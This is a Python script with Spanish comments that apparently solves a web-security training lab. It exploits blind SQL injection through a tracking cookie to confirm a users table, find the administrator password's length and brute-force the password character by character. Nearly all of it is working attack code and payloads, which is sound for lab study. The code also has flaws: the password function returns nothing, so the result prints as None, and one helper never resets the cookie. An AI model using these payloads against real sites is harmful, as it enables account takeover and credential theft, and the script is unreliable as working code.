"""
Blind SQL injection with conditional responses

Parametro vulnerable: tracking cookie

Objetivos:
    1) Obtener el password de administrator
    2) Ingresar a la aplicacion como el usuario administrator

Analisis:

1) Confirmar que el parametro es vulnerable a blind SQL Injection

SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>'
    si el tracking-id existe -> consulta devuelve el valor "Welcome back"
    si el tracking-id no existe -> no hay valor
    
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=1 --' -> TRUE -> Welcome back message
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND 1=0 --' -> FALSE -> NO Welcome back message

2) Confirmar que existe una tabla users
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --'

3) Confirmar que el usuario administrator existe en la tabla users
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' --'
-> si esta consulta es verdadera entonces el usuario administrator existe

4) Enumerar el password de usuario administrator
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'administrator' --'
-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres

5) Ataque de fuerza bruta probando caracter por caracter
SELECT tracking-id FROM tracking-table WHERE tracking-id = '<value>' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' AND LENGTH(password)>1) = 'a' --'
-> esta consulta nos permite determinar que la longitud del password es de 20 caracteres

"""

import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url, cookies):
    password_extracted = ""
    for i in range (1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies['TrackingId'] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            
def mensaje_de_salida(mensaje):
    print(mensaje)
    print('Saliendo del sistema')
    sys.exit(-1)

def obtener_cookies(url):
    cookies = requests.get(url).cookies
    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
    print("Cookies obtenidas:")
    for idx, (name, value) in enumerate(cookies_dict.items(),1):
        print(f"{idx}. {name}: {value}")
    return cookies_dict

def seleccionar_cookie():
    print('Que cookie desea explotar?: ', end="")
    indice =  int(input())
    return (indice - 1)

def confirmar_cookie_explotable(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload_true = "' AND 1=1 --"
    sqli_payload_encoded_true = urllib.parse.quote(sqli_payload_true)
    cookies_true = cookies
    cookies_true[nombre_cookie] += sqli_payload_encoded_true
    res_true = requests.get(url, cookies = cookies_true)
    cookies[nombre_cookie] = valor_original_cookie
    
    sqli_payload_false = "' AND 1=0 --"
    sqli_payload_encoded_false = urllib.parse.quote(sqli_payload_false)
    cookies_false = cookies
    cookies_false[nombre_cookie] += sqli_payload_encoded_false
    res_false = requests.get(url, cookies = cookies_false)
    cookies[nombre_cookie] = valor_original_cookie

    test_string = "Welcome"
    return test_string in res_true.text and test_string not in res_false.text

def confirmar_tabla_users(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]

    sqli_payload = "' AND (SELECT 'x' FROM users LIMIT 1) = 'x' --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies = cookies)
    cookies[nombre_cookie] = valor_original_cookie

    test_string = "Welcome"
    return test_string in res.text

def confirmar_usuario_administrator(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload = "' AND (SELECT username FROM users WHERE username='administrator') = 'administrator' --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies=cookies)
    cookies[nombre_cookie] = valor_original_cookie
    
    test_string = "Welcome"
    return test_string in res.text

def determinar_longitud_password(url, cookies, cookie_a_explotar):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    contador = 1
    while True:
        sqli_payload = f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>{contador}) = 'administrator' --"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies[nombre_cookie] += sqli_payload_encoded
        res = requests.get(url, cookies=cookies)
        cookies[nombre_cookie] = valor_original_cookie
        
        test_string = "Welcome"
        if test_string in res.text:
            print(f'probando longitud del password: {contador}')
            contador += 1
        else:
            return contador  
    
def obtener_password(url, cookies, cookie_a_explotar, longitud_password):
    password_extracted = ""
    
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    for i in range (1,longitud_password+1):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies[nombre_cookie] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            cookies[nombre_cookie] = valor_original_cookie
            
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break

def main():
    url = "https://0a3d003e043c6e9c803e532500100094.web-security-academy.net/"
    cookies = obtener_cookies(url)
    cookie_a_explotar = seleccionar_cookie()
    
    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar)
    if not cookie_es_explotable:
        mensaje_de_salida('La cookie seleccionada no es explotable')
            
    # 2) Confirmar que existe una tabla users
    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar)
    if not existe_tabla_users:
        mensaje_de_salida('No existe una tabla users')
        
    # 3) Confirmar que el usuario administrator existe en la tabla users
    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar)
    if not existe_usuario_administrator:
        mensaje_de_salida('No existe el usuario administrador')

    # 4) Enumerar el password de usuario administrator
    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar)
    print(f"Longitud del password: {longitud_password} caracteres")
    
    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password)
    print(f"El password obtenido es: {password}")
    
if __name__ == "__main__":
    main()